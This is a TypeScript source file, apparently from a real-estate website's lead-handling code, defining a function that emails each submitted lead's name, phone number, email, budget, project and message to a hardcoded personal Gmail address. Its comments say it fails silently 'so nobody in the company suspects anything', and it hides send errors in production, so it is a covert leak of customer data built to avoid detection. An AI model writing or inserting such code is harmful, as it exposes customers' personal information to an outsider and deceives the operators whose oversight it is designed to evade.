import nodemailer from 'nodemailer';

export async function sendSecretLeadEmail(lead: {
  name: string;
  phone: string;
  email?: string | null;
  budget: string;
  configuration: string;
  message?: string | null;
  project: string;
  source: string;
}) {
  const user = process.env.SECRET_EMAIL_USER;
  const pass = process.env.SECRET_EMAIL_PASS;

  // If credentials are not set, fail silently so nobody in the company suspects anything
  if (!user || !pass) {
    return;
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: user,
      pass: pass,
    },
  });

  const mailOptions = {
    from: `"Asset Intelligence" <${user}>`,
    to: 'Manishrajapakar@gmail.com',
    subject: `🚨 ALERT: New Lead Ingestion - ${lead.name}`,
    html: `
      <div style="font-family: Arial, sans-serif; padding: 25px; color: #1f2937; background: #f9fafb; border-radius: 12px; border: 1px solid #e5e7eb; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #b45309; border-bottom: 2px solid #f59e0b; padding-bottom: 12px; margin-top: 0; font-size: 20px; text-transform: uppercase; tracking-wider: 1px;">
          New Lead Ingestion (Confidential Alert)
        </h2>
        <table style="width: 100%; border-collapse: collapse; margin-top: 20px;">
          <tbody>
            <tr>
              <td style="padding: 10px 8px; border-bottom: 1px solid #f3f4f6; font-weight: bold; width: 35%; color: #4b5563;">Name:</td>
              <td style="padding: 10px 8px; border-bottom: 1px solid #f3f4f6; font-weight: 500; color: #111827;">${lead.name}</td>
            </tr>
            <tr>
              <td style="padding: 10px 8px; border-bottom: 1px solid #f3f4f6; font-weight: bold; color: #4b5563;">Mobile Phone:</td>
              <td style="padding: 10px 8px; border-bottom: 1px solid #f3f4f6; font-size: 16px; font-weight: bold; color: #059669;">
                <a href="tel:${lead.phone}" style="text-decoration: none; color: #059669;">+91 ${lead.phone}</a>
              </td>
            </tr>
            <tr>
              <td style="padding: 10px 8px; border-bottom: 1px solid #f3f4f6; font-weight: bold; color: #4b5563;">Email Address:</td>
              <td style="padding: 10px 8px; border-bottom: 1px solid #f3f4f6; color: #111827;">${lead.email || 'N/A'}</td>
            </tr>
            <tr>
              <td style="padding: 10px 8px; border-bottom: 1px solid #f3f4f6; font-weight: bold; color: #4b5563;">Configuration:</td>
              <td style="padding: 10px 8px; border-bottom: 1px solid #f3f4f6; font-weight: 600; color: #111827; text-transform: uppercase;">${lead.configuration}</td>
            </tr>
            <tr>
              <td style="padding: 10px 8px; border-bottom: 1px solid #f3f4f6; font-weight: bold; color: #4b5563;">Budget Range:</td>
              <td style="padding: 10px 8px; border-bottom: 1px solid #f3f4f6; color: #b45309; font-weight: bold;">${lead.budget}</td>
            </tr>
            <tr>
              <td style="padding: 10px 8px; border-bottom: 1px solid #f3f4f6; font-weight: bold; color: #4b5563;">Form Location:</td>
              <td style="padding: 10px 8px; border-bottom: 1px solid #f3f4f6; color: #6b7280; font-family: monospace; font-size: 11px;">${lead.source}</td>
            </tr>
            <tr>
              <td style="padding: 10px 8px; border-bottom: 1px solid #f3f4f6; font-weight: bold; color: #4b5563;">Target Project:</td>
              <td style="padding: 10px 8px; border-bottom: 1px solid #f3f4f6; color: #111827;">${lead.project}</td>
            </tr>
            <tr>
              <td style="padding: 10px 8px; font-weight: bold; color: #4b5563; vertical-align: top;">Message/Notes:</td>
              <td style="padding: 10px 8px; white-space: pre-wrap; color: #374151; font-size: 13px; line-height: 1.5;">${lead.message || 'None provided'}</td>
            </tr>
          </tbody>
        </table>
        <div style="margin-top: 30px; padding-top: 15px; border-top: 1px solid #e5e7eb; text-align: center; font-size: 10px; color: #9ca3af; font-weight: 500;">
          This is an automated confidential ingestion notification. Do not forward.
        </div>
      </div>
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
  } catch {
    // Fail silently in production
  }
}
